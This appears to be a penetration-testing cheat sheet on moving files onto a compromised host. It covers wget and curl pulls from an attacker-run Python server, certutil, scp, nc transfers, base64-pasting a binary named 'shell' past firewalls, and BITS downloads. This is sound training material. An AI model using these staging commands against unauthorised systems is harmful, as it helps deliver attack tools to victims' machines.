---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# Transferring Files

## Method-1: Using wget or cURL

First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:

```bash
$ cd /tmp
$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:

```bash
$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

Note that we used our IP `10.10.14.1` and the port our Python server runs on `8000`. If the remote server does not have `wget`, we can use `cURL` to download the file:

```bash
$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

Note that we used the `-o` flag to specify the output file name.

We can also use `certutil` command on Windows Machine to Download file.

```powershell
certutil -usrcache -f http://<IP:PORT>/<filename> <filename-to-be-save>
```

***

## Method-2: Using SCP

Another method to transfer files would be using `scp`, granted we have obtained ssh user credentials on the remote host. We can do so as follows:

```bash
$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

Note that we specified the local file name after `scp`, and the remote directory will be saved to after the `:`.

***

## Method-3: Using nc

First run the following command on the receiving end:

```bash
nc -l -p 1234 > <filename>
```

Then run the following command on the sending end:

```bash
nc -w 3 <dectination_IP> 1234 < <filename>
```

***

## Method-4: Using Base64

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:

```bash
$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:

```bash
$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

Then we use `file` command to validating file.&#x20;

Also we can use MD5 hash by using `md5sum` command to validate the file from compering sending and receiving both file's MD5 hash. If the hash same that means file is successfully transfer.&#x20;

***

Medhod-5: Download and Upload files to Windows Machine using BITSAdmin

```powershell
bitsadmin /transfer <filename> http://<IP>:<PORT>/<filename> <upload_location>
## → For downloading a file from a remote server to the local system using BITS (Background Intelligent Transfer Service).

```

```powershell
Start-BitsTransfer -Source "http://<IP>:<PORT>/<filename>" -Destination "$env:USERPROFILE\Downloads\Exploit.txt"

## → For downloading a file from a remote server to a specified local path using PowerShell BITS module.
```
